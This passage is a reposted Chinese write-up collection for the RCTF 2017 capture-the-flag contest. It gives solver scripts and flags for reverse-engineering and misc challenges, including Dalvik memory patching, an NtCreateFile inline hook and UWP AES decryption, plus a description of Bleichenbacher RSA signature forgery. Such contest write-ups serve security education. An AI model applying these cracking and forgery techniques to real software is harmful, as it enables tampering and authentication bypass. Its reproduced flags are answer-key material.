                        int m = shrl(n, inner_log(v10));
                        cur_dword[2] = m + *tmp_key;
                        fourth_dword = *cur_dword;
                        *cur_dword = cur_dword[1];
                        cur_dword[1] = cur_dword[2];
                        cur_dword[2] = cur_dword[3];
                        cur_dword[3] = fourth_dword;
                        v18 = block_size-- == 1;
                    } while (!v18);
                    *cur_dword += ctx->key_d;
                    cur_dword[2] += ctx->key_e;
                    offset += 16;
                } while (offset < ctx->len);
            }
        }
    }
    char sn[64] = "11111111111111111111111111111111";
    unsigned char g_data[64] = {243, 56, 159, 56, 241, 33, 111, 152, 99, 239, 107, 106, 185, 26, 56, 181, 116, 137, 164, 250, 121, 22, 144, 200, 113, 46, 201, 99, 13, 223, 111, 77, 114, 127, 192, 105, 61, 118, 63, 238, 201, 35, 52, 118, 45, 183, 28, 56, 120, 247, 197, 41, 106, 19, 12, 188, 94, 179, 174, 182, 98, 188, 10, 56};
    int main(int argc, char* argv[])
    {
        int i;
        context ctx = { 0 };
        ctx.sn = (unsigned int*)sn;
        ctx.len = 64;
        ctx.key_a = 0x5bf76637;
        ctx.key_b = 0x4748da7a;
        memcpy(ctx.key_table, data, 4 * 32);
        ctx.key_d = 0x7faf076d;
        ctx.key_e = 0x9bd7fa4c;
        encrypt(&ctx, 1);
        encrypt(&ctx, 0);
        ctx.sn = (unsigned int*)g_data;
        for(i=0;i<64;i++)
            printf("%x ",*((unsigned char *)ctx.sn+i));
        printf("nn");
        encrypt(&ctx, 0);
        for(i=0;i<64;i++)
            printf("%02x",*((unsigned char *)ctx.sn+i));
        return 0;
    }

570065006c0063006f006d006500200074006f002000720063007400660032003000310037002c0020006e0069006300650020006400610079002e0000000000
unicode的字符编码，转换成字符：Welcome to rctf2017, nice day.

**easyre**

Category:RE Score:153

upx加壳。脱壳即可。

屏幕输入的值需要与子进程的id一致才行。

获得假的flag。

lol函数打印flag。

1！=0，因此程序永远跳转loc_80486D3。 通过修改二进制，更改汇编指令即可得到正确的flag。

或者通过lol函数算法取得：

    
    
    temp = [
        [1, 1],
        [4, 5],
        [8, 9],
        [12, 12],
        [18, 17],
        [10, 21],
        [9, 25]
    ]
    key = "69800876143568214356928753"
    flag = ""
    for i in temp:
        flag += chr(ord(key[i[0]]) + ord(key[i[1]]))
    print flag

正确的flag：rhelheg

**HelloDalivk**

Category:RE

首先，我想道个歉。由于我个人的失误，导致大佬们体验下降。对于此次不断更新题目，感到万分抱歉！！

下面说一下我的出题思路：

在Dalvik虚拟机下，由于程序启动时，系统将dex文件直接映射到内存，因此，我们可以通过修改内存中字节码来实现代码逻辑的改变。刚开始是不希望选手通过动态调试得到我修改完的方法逻辑。因此设定刚开始修改后的逻辑是不可用的，目的是要选手通过逆向so文件修复代码，得到正确逻辑。但是由于题目没有讲清楚，导致坑点太大。根据选手提问得到的反馈，都没有往这方面想的意思，决定在题目里加点提示，但是上传了有问题的版本。因为剩余时间的缘由，最后上传那一次我我就自己把坑补上了(哭)。

这里我们主要看libnative-lib.so文件：

首先通过/proc/pid/maps找到dex文件的内存地址，进而根据要修改的类字符串找到具体方法的偏移地址：

    
    
    stridx->TypeIdx->ClassDefItem->ClassDataItem
    ->MethodIdx + ClassDataItem
    ->EncodeMethod---->code_off

关于dex的具体结构大家可以在源码dalviklibdexDexClass.h 和 dalviklibdexDexFile.h 中找到。

接下来是代码修改逻辑，有个坑点在这：这里用了随机数决定代码修改后的逻辑，由于是伪随机，所以结果可预测，需要根据原有指令码修改成可执行代码。(没有给足提示，后来被改掉了)

之后我们就知道了

    
    
    MathMethod_4 -> add;
    MathMethod_1 -> mod;

原版本是:MathMethod_4-> mod MathMethod_1->mul
//顺便说下，在某些特定API版本随机数是可以得到上面结果的不需要改(我的API18就行233333

接下来就剩下payload了

因为变换比较复杂，可以选择暴力破解。这里有两种思路，一是根据代码：将字符的ASCII码个位数和十位数分离，然后打表爆破；二是直接爆破可见字符串。

这里给出爆破可见字符串代码：

    
    
    def get_pwd(str, num):
        if(num == 1):
            for x in str:
                yield x
        else:
            for x in str:
                for y in get_pwd(str, num-1):
                    yield x + y
    def flag():
        i = 0
        for flag_1 in get_pwd(code_4,3):
            result_1 = ''
            result_2 = ''
            for i in range(32):
                a = i % len(flag_1)
                b = i % len(code_3)
                c = b + (ord(flag_1[a]) % 10)
                d = c % ord(code_3[b])
                e = c * d
                f = d ^ ord(code_3[a])
                g = e + f
                result_1 += chr(g & 0xff)
            for i in range(32):
                result_2 += code_2[int(ord(flag_1[ i % len(flag_1)]) / 10 % 10 + ord(result_1[i])) % 16]
            if (code_1 == result_2):
                print ('good')
                print (result_2)
                print (flag_1)

**I Need a Waiter**

Category:RE

题目是用 TypeScript 写的, 可以用 Generator is already executing. 报错信息搜索得知. 因此安装
TypeScript 随意编译一个带有 async/await 语法的程序即可推出程序原结构.

整个程序使用 async/await 编写, 目前的 js 调试器对这种程序都不好调试(如单步调试等方法). 所以可以使用在每个函数的开始结尾打 log
或者改写 Array.prototype.push 之类函数的进行行为分析.

使用 tsc 直接编译程序即可得到未混淆的 js 代码. (见 dist/ts1.js)

**MyDriver2**

Category:RE Score:392

一个简单的Inlinehook，hook NtCreateFile 函数。

在任意路径打开文件名为 P_giveMe_flag_233.txt 的文件超过8次，在第9次打开 P_giveMe_flag_233.txt
的时候就会在里面写入flag。 文件名进过简单的加密，加密的 key 是自己构造的一段 win64 的汇编生成。

    
    
    the flag is A_simple_Inline_hook_Drv

**uwp**

Category:RE Score:454

安装uwp需要开启开发者模式，以及开启powershell的运行权限 用powershell运行Add-AppDevPackage.ps1，安装应用。
安装后可以在windows的菜单中找到应用，打开发现一个输入框和一个按钮getflag，输入数字可以得到返回。 逆向uwp可以使用Telerik
JustDecompile这款软件，.appxbundle后缀的文件是程序主体，不能直接托进入逆，
这是打包过的程序，直接解压可以发现arm，x64，x86版的appx，可以选择x86的appx放入Telerik
JustDecompile中，找到MainPage，可以看待代码逻辑，代码非常简单，只是一个数据库查询，但数据库内容使用aes加密，密钥是
Package.get_Current().get_Id().get_FamilyName().Substring(0, 16)， 这是uwp的
Package Family
Name，是每个uwp应用独一无二的身份id，可以在安装后在C:Users(username)AppDataLocalPackages(packagename)
可以找到，或者继续解压appx在AppxManifest.xml中找到,或者。
之后解压appx中找到sqlite，解密遍历一遍，找到'RCTF{'开头的明文即flag

MainPage.xaml

    
    
    <Page
        x:Class="RCTF.MainPage"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:local="using:RCTF"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        mc:Ignorable="d">
        <Grid Background="{ThemeResource ApplicationPageBackgroundThemeBrush}">
            <Button x:Name="button"
                    Content="GetFlag"
                    HorizontalAlignment="Left"
                    Margin="233,119,0,0"
                    VerticalAlignment="Top"
                    Click="button_Click"/>
            <TextBlock x:Name="textBlock"
                       HorizontalAlignment="Left"
                       Margin="233,180,0,0"
                       TextWrapping="Wrap"
                       VerticalAlignment="Top"
                       Height="28"
                       Width="583"/>
            <TextBox Name="textBox"
                     VerticalAlignment="Top"
                     TextWrapping="Wrap"
                     Width="370"
                     Margin="233,56,0,0"
                     HorizontalAlignment="Left"
                     />
        </Grid>
    </Page>
    MainPage.xaml.cs
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Linq;
    using System.Runtime.InteropServices.WindowsRuntime;
    using Windows.Foundation;
    using Windows.Foundation.Collections;
    using Windows.UI.Xaml;
    using Windows.UI.Xaml.Controls;
    using Windows.UI.Xaml.Controls.Primitives;
    using Windows.UI.Xaml.Data;
    using Windows.UI.Xaml.Input;
    using Windows.UI.Xaml.Media;
    using Windows.UI.Xaml.Navigation;
    using Windows.Security.Cryptography;
    using Windows.Security.Cryptography.DataProtection;
    using Windows.Storage.Streams;
    using System.Threading.Tasks;
    using SQLite.Net.Attributes;
    using SQLite.Net;
    using SQLite.Net.Platform.WinRT;
    using Windows.Security.Cryptography;
    using Windows.Security.Cryptography.Core;
    //“空白页”项模板在 http://go.microsoft.com/fwlink/?LinkId=402352&clcid=0x409 上有介绍
    namespace RCTF
    {
        /// <summary>
        /// 可用于自身或导航至 Frame 内部的空白页。
        /// </summary>
        public sealed partial class MainPage : Page
        {
            //string path = Path.Combine(Windows.Storage.ApplicationData.Current.LocalFolder.Path, "flag.sqlite");
            string path = Path.Combine(Windows.ApplicationModel.Package.Current.InstalledLocation.Path, @"Assetsflag.sqlite");
            string pfn = Windows.ApplicationModel.Package.Current.Id.FamilyName;
            SQLite.Net.SQLiteConnection conn;
            public MainPage()
            {
                this.InitializeComponent();
                conn = new SQLiteConnection(new SQLitePlatformWinRT(), path);
                conn.CreateTable<flag_table>();
            }
            private void button_Click(object sender, RoutedEventArgs e)
            {
                int id;
                bool b = int.TryParse(textBox.Text, out id);
                if (b)
                {
                    var s = (from p in conn.Table<flag_table>()
                             where p.Id == id
                             select p.flag);
                    foreach (var r in s)
                        textBlock.Text = "flag:" + dfdfdfd(r);
                }
            }
            public static string asdasd(String input)
            {
                IBuffer txtBuffer = CryptographicBuffer.ConvertStringToBinary(input, BinaryStringEncoding.Utf8);
                string PFN = Windows.ApplicationModel.Package.Current.Id.FamilyName.Substring(0, 16);
                string AES_IV = "0000000000000000";
                IBuffer iv = System.Text.Encoding.UTF8.GetBytes(AES_IV).AsBuffer();
                byte[] keyBtArray = System.Text.Encoding.UTF8.GetBytes(PFN);
                SymmetricKeyAlgorithmProvider provider = SymmetricKeyAlgorithmProvider.OpenAlgorithm(SymmetricAlgorithmNames.AesCbcPkcs7);
                CryptographicKey m_key = provider.CreateSymmetricKey(keyBtArray.AsBuffer());
                IBuffer cryptBuffer = CryptographicEngine.Encrypt(m_key, txtBuffer, iv);
                return CryptographicBuffer.EncodeToBase64String(cryptBuffer);
            }
            public static string dfdfdfd(String input)
            {
                IBuffer txtBuffer = Convert.FromBase64String(input).AsBuffer();
                string PFN = Windows.ApplicationModel.Package.Current.Id.FamilyName.Substring(0, 16);
                string AES_IV = "0000000000000000";
                IBuffer iv = System.Text.Encoding.UTF8.GetBytes(AES_IV).AsBuffer();
                byte[] keyBtArray = System.Text.Encoding.UTF8.GetBytes(PFN);
                SymmetricKeyAlgorithmProvider provider = SymmetricKeyAlgorithmProvider.OpenAlgorithm(SymmetricAlgorithmNames.AesCbcPkcs7);
                CryptographicKey m_key = provider.CreateSymmetricKey(keyBtArray.AsBuffer());
                IBuffer cryptBuffer = CryptographicEngine.Decrypt(m_key, txtBuffer, iv);
                return CryptographicBuffer.ConvertBinaryToString(BinaryStringEncoding.Utf8, cryptBuffer);
            }
        }
        public class flag_table
        {
            public int Id { get; set; }
            public string flag { get; set; }
        }
    }

**MISC**

**light**

Category:MISC Score:434

使用一下代码计算出点击的位置，然后保存到到 1.txt

    
    
    from libnum import invmod
    import numpy as np
    import struct
    color_num = 2
    with open("data", "rb") as f:
        s = f.read()
    width = struct.unpack("<i", s[:4])[0]
    height = struct.unpack("<i", s[4:8])[0]
    s = s[8:]
    mymap = [0 for i in range(height*width)]
    def click(pos):
        d = [(2,0),(0,2),(-2,0),(0,-2),(1,1),(1,-1),(-1,1),(-1,-1)]
        x, y = pos
        for off_x, off_y in d:
            if 0<=x+off_x<height and 0<=y+off_y<width:
                mymap[(x+off_x)*width + y+off_y] = (mymap[(x+off_x)*width + y+off_y] + 1) % color_num
    def clear():
        for i in range(height-2):
            for j in range(width):
                while mymap[i*width+j]:
                    click((i+2, j))
        return mymap[-2*width:]
    def solve(a_f, a_y):
        f = np.copy(a_f)
        y = np.copy(a_y)
        n = a_f.shape[0]
        for i in range(n):
            for j in range(n):
                if f[j,i]:
                    k = 0
                    while k < i:
                        if f[j,k] % color_num:
                            break
                        k += 1
                    if k == i:
                        f[i], f[j] = np.copy(f[j]), np.copy(f[i])
                        y[i], y[j] = np.copy(y[j]), np.copy(y[i])
                        break
            if f[i,i] % color_num:
                for j in range(n):
                    while j!=i and f[j,i] % color_num:
                        f[j] = (f[j] + f[i]) % color_num
                        y[j] = (y[j] + y[i]) % color_num
        result = []
        for i in range(n):
            if(f[i][i]):
                result.append((invmod(f[i][i], color_num)*y[i])%color_num)
            else:
                result.append(0)
        assert np.array_equal(a_f.dot(result) % color_num, a_y)
        return result
    f = []
    for i in range(2):
        for j in range(width):
            click((i,j))
            f.append(clear())
            for k in range(color_num-1):
                click((i,j))
    f = np.array(f).T
    mymap = []
    for i in range(height*width):
        mymap.append(ord(s[i]))
    y = clear()
    result = solve(f, y)
    for i in range(len(result)):
        result[i] = (color_num-result[i]) % color_num
    mymap = []
    for i in range(height*width):
        mymap.append(ord(s[i]))
    with open("1.txt", "wb") as f:
        for i in range(len(result)):
            while result[i]:
                click((i/width, i%width))
                f.write("%s %sn" %(i/width, i%width))
                result[i] -= 1;
        for i in range(height-2):
            for j in range(width):
                while mymap[i*width+j]:
                    click((i+2, j))
                    f.write("%s %sn" %(i+2, j))

编写一个模拟点击的程序 click.exe 读取 1.txt 的内容进行点击，然后就可以得到flag。

附上 click.exe 的源码

    
    
    #include <stdio.h>
    #include <windows.h>
    void click(HWND hwnd, int x, int y)
    {
        SendMessage(hwnd, WM_LBUTTONDOWN, 0, y<<16|x);
        SendMessage(hwnd, WM_LBUTTONUP, 0, y<<16|x);
    }
    int main()
    {
        int x, y;
        int size, height, width;
        FILE * d = fopen("data", "rb");
        FILE * f = fopen("1.txt", "rb");
        HWND hwnd = FindWindow(NULL, "Light");
        if(d && f && hwnd)
        {
            fread(&width,1,4,d);
            fread(&height,1,4,d);
            size = 512 / (width>height?width:height);
            printf("%dn", size);
            while(fscanf(f,"%d %d",&y,&x)!=EOF)
            {
                click(hwnd, x*size, y*size);
            }
        }
        return 0;
    }

flag 是 Gaussian_elimination_is_awesome!

**RCTF 2017 baby enc writeup**

本题读取 in.txt ，将每两个相邻字符两两异或，得到一个新的字符串，如此循环六次后写出到 out.txt 。

已知 flag 在 in.txt 中，格式为 RCTF{xxxxxx}，则对于 out.txt 中的每个字符都可以假设它为 RCTF{x 经过 enc()
后的结果，进行爆破即可。

    
    
    ●●●●●☆ (假设前五个字符为“RCTF{”)
     ○○○○○
      ○○○○
       ○○○
        ○○
         ●  (对于 out.txt 中的每个字符)

**massage**

Category:MISC Score:465

将HEX转BIN后得到一个1679bits的信息

1679=23*73是两个质数之积

然后按73一行进行输入，就可以看到flag。

    
    
    flag: RCTF{ArEciBo_mEsSaGe}

**mysql**

Category:MISC Score:238

本题考的是 MySQL 的数据恢复。

恢复 MySQL 被删除的数据使用可以使用工具 [undrop-for-innodb](https://weiyiling.cn/media/blogs/one/quick-uploads/p17/undrop-for-innodb-master.zip)

make编译工具，新建backup文件夹并将所需要的相关文件拷贝到文件夹下。

接着如下图所示，工具一步步恢复即可，flag为数据库ctf中user表中flag用户对应密码。

得到 flag：71e55075163d5c6410c0d9eae499c977

**intoU**

Category:MISC

将bmp格式图片信息写入频谱图，加在歌曲末尾。 （原本是将flag切割成几段，穿插剪辑在电音歌曲中电子部分。但是过程中损失较大，不易恢复）

  

**CRYPTO**

**RSA_sign1/2**

Category:CRYPTO

当客服期间学到的名词Bleichenbacher’s Attack

签名生成后，为满足长度要求（pubkey.n）需进行填充。

在指数很小时，可以通过构造填充部分伪造签名。使签名满足验证要求

    
    
    0001 fff …… ff 00 ASN.1 HASH
    0001 anything 00 ASN.1 HASH

而不被验证的填充部分与私钥生成的签名不同。

对于了解这个漏洞的选手来说是非常简单的题目。

而对于其他选手，RSA_sign1可以算是2的一个hint，通过一个简单的实践了解填充验证方面的问题

  

**传送门**

* * *

[**RCTF
2017上演安全极客的速度与激情，国际黑马战队motesolo积分榜排名第一！**](http://bobao.360.cn/news/detail/4173.html)

  

本文翻译自xctf.org.cn
[原文链接](https://www.xctf.org.cn/information/e0d90ad9d0609320fd6743706135a80913d27b8d/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **XCTF联赛大静** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86198](/post/id/86198)

安全客 - 有思想的安全新媒体

本文转载自:
[xctf.org.cn](https://www.xctf.org.cn/information/e0d90ad9d0609320fd6743706135a80913d27b8d/)

如若转载,请注明出处：
<https://www.xctf.org.cn/information/e0d90ad9d0609320fd6743706135a80913d27b8d/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF通关攻略](/tag/CTF通关攻略)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhmsg.com/dm/200_200_100/t018ce00d6e37d90e24.jpg) XCTF联赛大静

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

